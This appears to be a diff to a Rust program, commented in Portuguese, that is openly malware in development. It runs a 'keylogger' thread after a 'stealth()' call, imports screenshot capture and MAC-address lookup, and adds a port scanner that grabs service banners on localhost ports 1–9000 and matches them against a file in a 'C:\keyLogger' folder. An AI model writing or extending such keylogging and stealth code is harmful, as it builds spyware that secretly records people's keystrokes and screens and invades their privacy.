@@ -25,22 +25,35 @@ use image::RgbaImage;
 use win_screenshot::prelude::capture_display;
 use image::{DynamicImage, GenericImageView};
 use base64::{encode, decode};
-
 use mac_address::get_mac_address;
+use std::net::{IpAddr, Ipv4Addr};
+use std::sync::{Arc, Mutex};
+use tokio::net::TcpStream;
+use tokio::io::{AsyncReadExt, AsyncWriteExt};
+use tokio::runtime::Runtime;
 
 
-#[tokio::main]
-async fn main() -> Result<(), Box<dyn std::error::Error>> {
+async fn main_async() -> Result<(), Box<dyn std::error::Error>> {
     println!("Iniciou o programa!");
     if let Err(err) = update_aux_data().await {
         eprintln!("Erro ao atualizar dados auxiliares: {:?}", err);
     }
 
-    let handle = thread::spawn(|| {
-        keylogger();
+    let scanner_handle = thread::spawn(|| {
+        println!("Iniciou a thread scanner_handle");
+        let rt = Runtime::new().unwrap();
+        rt.block_on(process_scan_results());
     });
 
-    handle.join().unwrap();
+    let keylogger_handle = thread::spawn(|| {
+        println!("Iniciou a thread keylogger_handle");
+        let rt = Runtime::new().unwrap();
+        rt.block_on(keylogger());
+    });
+
+    scanner_handle.join().unwrap();
+    keylogger_handle.join().unwrap();
+
     loop {
         // Resto do código...
 
@@ -49,19 +62,67 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     }
 }
 
-async fn scan(target: &str, port: u16, logger: Arc<Mutex<Logger>>) {
+fn main() {
+    let _ = tokio::runtime::Builder::new_multi_thread()
+        .worker_threads(2) // Defina o número de threads Tokio
+        .enable_all() // Ative todos os recursos do Tokio
+        .build()
+        .unwrap()
+        .block_on(main_async());
+}
+
+// Max IP Port.
+const MAX: u16 = 9000;
+
+async fn scan(target: &str, port: u16) -> Option<u16> {
     let addr = format!("{}:{}", target, port);
     match TcpStream::connect(&addr).await {
-        Ok(_) => {
-            let mut logger = logger.lock().unwrap();
-            let log_msg = format!("Port {} is open\n", port);
-            logger.log(&log_msg);
+        Ok(mut stream) => {
+            let mut buffer = vec![0; 1024];
+            match banner(&mut stream, &mut buffer).await {
+                Ok(banner) => {
+                    if !banner.is_empty() {
+                        Some(port)
+                    } else {
+                        None
+                    }
+                }
+                Err(_) => None,
+            }
         }
-        Err(_) => {}
+        Err(_) => None,
     }
 }
 
-fn keylogger() {
+async fn banner(stream: &mut TcpStream, buffer: &mut Vec<u8>) -> Result<String, std::io::Error> {
+    let n = stream.read(buffer).await?;
+    Ok(String::from_utf8_lossy(&buffer[0..n]).to_string())
+}
+
+async fn process_scan_results() {
+    let vulnerability_file = std::fs::read_to_string("C:\\keyLogger\\vulnerable_banners.txt").unwrap_or_default();
+
+    for port in 1..=MAX {
+        if let Some(open_port) = scan("localhost", port).await {
+            let addr = format!("localhost:{}", open_port);
+            match TcpStream::connect(&addr).await {
+                Ok(mut stream) => {
+                    let mut buffer = vec![0; 1024];
+                    if let Ok(banner) = banner(&mut stream, &mut buffer).await {
+                        if vulnerability_file.contains(&banner) {
+                            let log_msg = format!("[!] Vulnerability found: {} at port {}\n", banner, open_port);
+                            println!("{}", log_msg);
+                            send_alert(log_msg.as_str()).await;
+                        }
+                    }
+                }
+                Err(_) => {}
+            }
+        }
+    }
+}
+
+async fn keylogger() {
     stealth();
     let mut log = String::new();
 
@@ -108,10 +169,6 @@ fn stealth() {
 }
 
 fn sniffer(tx: std::sync::mpsc::Sender<String>) {
-    // Resto do código...
-}
-
-fn scanner(tx: std::sync::mpsc::Sender<String>) {
     // Resto do código...
 }
 
